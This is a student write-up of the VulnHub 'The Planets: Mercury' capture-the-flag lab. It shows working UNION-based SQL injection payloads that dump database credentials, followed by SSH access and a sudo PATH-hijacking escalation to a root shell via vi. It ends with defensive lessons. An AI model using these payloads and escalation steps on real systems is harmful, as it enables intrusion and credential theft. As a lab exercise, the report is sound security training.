# Lab #01 — The Planets: Mercury

## 1. Objective

The objective of this lab was to follow the exploitation process for the vulnerable virtual machine **The Planets: Mercury**, identify its vulnerabilities, obtain initial access, and escalate privileges until administrator/root access was achieved.

The lab was performed in a controlled environment using a vulnerable VM from VulnHub and Kali Linux as the attacking machine.

Reference walkthrough used during the lab:

* https://ra2302.github.io/posts/Mercury/
* https://www.vulnhub.com/entry/the-planets-mercury,544/

---

## 2. Lab Environment

The environment used for this lab was composed of:

| Component               | Description                                                                    |
| ----------------------- | ------------------------------------------------------------------------------ |
| Attacking machine       | Kali Linux                                                                     |
| Target machine          | The Planets: Mercury                                                           |
| Virtualization software | Oracle VirtualBox                                                              |
| Target IP               | `192.168.0.4`                                                                  |
| Main tools used         | `ip`, `nmap`, browser, SQL Injection payloads, `ssh`, `base64`, Linux commands |

---

## 3. VM Setup

First, I prepared the vulnerable machine:

1. Downloaded the `Mercury.ova` file.
2. Opened Oracle VirtualBox.
3. Imported the `Mercury.ova` appliance.
4. Started the Mercury virtual machine.
5. Used Kali Linux as the attacking machine.

After starting the VM, I needed to identify its IP address on the network.

---

## 4. Network Discovery

To identify my network interface and IP address, I used:

```bash
ip a
```

After checking my network, I scanned the subnet using Nmap:

```bash
sudo nmap -sn 192.168.0.16/24
```

The scan found the Mercury VM:

```text
Nmap scan report for 192.168.0.4
Host is up (0.0037s latency).
MAC Address: 08:00:27:72:7B:3D (Oracle VirtualBox virtual NIC)
```

The MAC address indicated that the machine was running through Oracle VirtualBox, so I identified `192.168.0.4` as the target VM.

---

## 5. Port Scanning

After finding the target IP, I scanned the relevant ports:

```bash
nmap -sC -sV -p 22,8080 192.168.0.4
```

The scan showed that the target had two important services exposed:

| Port   | Service              | Purpose                               |
| ------ | -------------------- | ------------------------------------- |
| `22`   | SSH                  | Remote login                          |
| `8080` | HTTP/Web application | Web application used for exploitation |

I then opened the web application in the browser:

```text
http://192.168.0.4:8080/
```

---

## 6. Web Application Enumeration

I started by exploring the web application manually.

First, I tried accessing:

```text
http://192.168.0.4:8080/console
```

This page generated an error. The error page mentioned the path `mercuryfacts/`, so I accessed:

```text
http://192.168.0.4:8080/mercuryfacts/
```

This page displayed information about Mercury and included links such as:

```text
http://192.168.0.4:8080/mercuryfacts/todo
```

and fact pages such as:

```text
http://192.168.0.4:8080/mercuryfacts/3/
```

I noticed that changing the final number in the URL displayed different Mercury facts.

For example:

```text
http://192.168.0.4:8080/mercuryfacts/1/
http://192.168.0.4:8080/mercuryfacts/2/
http://192.168.0.4:8080/mercuryfacts/3/
```

This suggested that the application was using the value in the URL to query the database.

---

## 7. SQL Injection Discovery

To test how the application handled invalid input, I replaced the numeric value with text:

```text
http://192.168.0.4:8080/mercuryfacts/abc/
```

The application returned the following error:

```text
OperationalError at /mercuryfacts/abc/
(1054, "Unknown column 'abc' in 'where clause'")
```

This error suggested that the input was being inserted directly into an SQL query without proper validation or sanitization.

I then tested SQL Injection with the following payload:

```text
http://192.168.0.4:8080/mercuryfacts/1 union all SELECT user()/
```

The application returned:

```text
Fact id: 1 union all SELECT user().
(('Mercury does not have any moons or rings.',), ('dbmaster@localhost',))
```

This confirmed that SQL Injection was possible and that the database user was:

```text
dbmaster@localhost
```

---

## 8. Database Enumeration

After confirming the SQL Injection vulnerability, I enumerated the available databases.

Payload used:

```text
http://192.168.0.4:8080/mercuryfacts/1 union all SELECT schema_name FROM information_schema.schemata
```

The application returned:

```text
(('Mercury does not have any moons or rings.',), ('information_schema',), ('mercury',))
```

This showed that the database of interest was:

```text
mercury
```

Next, I listed the database tables:

```text
http://192.168.0.4:8080/mercuryfacts/1 union all SELECT table_name FROM information_schema.tables;-- -/
```

The output showed several tables, including a table named:

```text
users
```

<img width="1133" height="368" alt="SQL Injection table enumeration" src="https://github.com/user-attachments/assets/e1654546-d8c6-42ad-954e-cf728df85ef3" />

---

## 9. Extracting User Credentials

After identifying the `users` table, I checked its columns:

```text
http://192.168.0.4:8080/mercuryfacts/1 union all SELECT column_name FROM information_schema.columns WHERE table_name %3D 'users'/
```

The output revealed the following columns:

```text
id
password
username
```

Then, I extracted the usernames and passwords:

```text
http://192.168.0.4:8080/mercuryfacts/1 union all SELECT group_concat(username,"-",password) from users/
```

The application returned:

```text
john-johnny1987,
laura-lovemykids111,
sam-lovemybeer111,
webmaster-mercuryisthesizeof0.056Earths
```

The most relevant credential was:

```text
Username: webmaster
Password: mercuryisthesizeof0.056Earths
```

---

## 10. Initial Access Through SSH

Using the extracted credentials, I tried to access the machine through SSH:

```bash
ssh webmaster@192.168.0.4
```

The login was successful.

<img width="711" height="669" alt="SSH login as webmaster" src="https://github.com/user-attachments/assets/055057d0-e656-49be-a062-0384171e1f09" />

At this point, I had initial access as the `webmaster` user.

---

## 11. User Flag

After logging in, I explored the user’s files:

```bash
ls
cat user_flag.txt
```

The user flag was successfully obtained.

<img width="458" height="162" alt="User flag" src="https://github.com/user-attachments/assets/17cce5cb-efca-4ad4-94bb-1f84ad0449c1" />

---

## 12. Local Enumeration

I then continued with local enumeration.

Inside the user directory, I found a project folder:

```bash
cd mercury_proj
ls
```

One of the files was:

```text
notes.txt
```

I opened it:

```bash
cat notes.txt
```

The file contained a Base64 encoded password for another user, `linuxmaster`.

The encoded value was:

```text
bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==
```

I decoded it with:

```bash
echo "bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==" | base64 -d
```

The decoded password was:

```text
mercurymeandiameteris4880km
```

<img width="791" height="224" alt="Base64 password decoding" src="https://github.com/user-attachments/assets/88433e9e-f8fe-4e7f-a558-797d17822713" />

---

## 13. Switching to the linuxmaster User

Using the decoded password, I switched to the `linuxmaster` user:

```bash
su linuxmaster
```

After entering the password, the user switch was successful.

I then checked the sudo permissions:

```bash
sudo -l
```

The output showed that `linuxmaster` could run the following script as root:

```text
/usr/bin/check_syslog.sh
```

<img width="950" height="315" alt="sudo permissions for linuxmaster" src="https://github.com/user-attachments/assets/cdc0c6d6-ccf4-4b2c-8bac-c24746c12bd6" />

This was an important finding because the script could be executed with root privileges.

---

## 14. Privilege Escalation

The script `/usr/bin/check_syslog.sh` used the `tail` command without specifying its full absolute path.

This allowed a privilege escalation technique known as **PATH hijacking**.

The idea was to create a malicious or redirected command named `tail` in the current directory. Then, by modifying the `PATH` variable, the system would execute my version of `tail` instead of the legitimate `/usr/bin/tail`.

First, I created a symbolic link named `tail` that pointed to `vi`:

```bash
ln -s /usr/bin/vi tail
```

Then, I modified the `PATH` variable so that the current directory would be searched first:

```bash
export PATH=.:$PATH
```

Finally, I executed the vulnerable script while preserving the modified `PATH`:

```bash
sudo --preserve-env=PATH /usr/bin/check_syslog.sh
```

Because the script executed `tail` without an absolute path, it opened `vi` with root privileges.

Inside `vi`, I executed:

```text
:shell
```

This opened a shell with root privileges.

<img width="910" height="856" alt="Privilege escalation and root flag" src="https://github.com/user-attachments/assets/25e38056-54ff-453a-8e9a-b7b7a6a1433f" />

To confirm root access, I used:

```bash
whoami
```

The output was:

```text
root
```

---

## 15. Root Flag

After obtaining a root shell, I accessed the root directory:

```bash
cd /root
ls
cat root_flag.txt
```

The root flag was successfully obtained.

---

## 16. Vulnerabilities Identified

The main vulnerabilities identified in this lab were:

| Vulnerability                  | Description                                                                                | Impact                                                   |
| ------------------------------ | ------------------------------------------------------------------------------------------ | -------------------------------------------------------- |
| SQL Injection                  | The web application accepted unsanitized input in the `mercuryfacts` URL parameter.        | Allowed database enumeration and credential extraction.  |
| Credential exposure            | User credentials were stored in the database and could be extracted through SQL Injection. | Allowed SSH access as `webmaster`.                       |
| Insecure password storage      | A password for another user was stored in a local file encoded with Base64.                | Allowed access to the `linuxmaster` user.                |
| Misconfigured sudo permissions | The `linuxmaster` user could execute a script as root.                                     | Enabled privilege escalation.                            |
| PATH hijacking                 | The privileged script used `tail` without its absolute path.                               | Allowed execution of `vi` as root and root shell access. |

---

## 17. Tools Used

| Tool                   | Purpose                                                    |
| ---------------------- | ---------------------------------------------------------- |
| `ip`                   | Checked local network configuration.                       |
| `nmap`                 | Discovered hosts and scanned open ports/services.          |
| Web browser            | Explored the vulnerable web application.                   |
| SQL Injection payloads | Enumerated the database and extracted credentials.         |
| `ssh`                  | Accessed the target machine remotely.                      |
| `base64`               | Decoded the password found in `notes.txt`.                 |
| `sudo -l`              | Checked allowed sudo commands.                             |
| `ln -s`                | Created a symbolic link for PATH hijacking.                |
| `vi`                   | Used to obtain a root shell through the vulnerable script. |

---

## 18. Difficulties and Notes

During the lab, the main difficulty was identifying the correct target IP address. Since the VM was running in VirtualBox using a bridged network configuration, I used Nmap to scan the local subnet and identify the host with an Oracle VirtualBox MAC address.

Another important point was understanding how the SQL Injection worked. Initially, changing the URL parameter only displayed different facts, but testing invalid input revealed an SQL error. This helped confirm that the parameter was being used directly in a database query.

The privilege escalation step was also relevant because it showed that even a simple command inside a root-executed script can become dangerous if the script relies on the `PATH` environment variable instead of using absolute command paths.

---

## 19. Conclusion

This lab demonstrated the importance of systematic enumeration in penetration testing. By starting with network discovery, then port scanning, web enumeration, SQL Injection testing, credential extraction, SSH access, and finally privilege escalation, it was possible to compromise the Mercury VM completely.

The most important security lessons from this lab are:

* Web applications should validate and sanitize all user input.
* SQL queries should use parameterized statements instead of directly concatenating user input.
* Passwords should never be stored in plaintext or weakly protected formats.
* Base64 is not encryption and should not be used to protect sensitive data.
* Sudo permissions should be carefully restricted.
* Scripts executed with elevated privileges should use absolute paths for system commands.

At the end of the lab, both the user flag and root flag were successfully obtained.
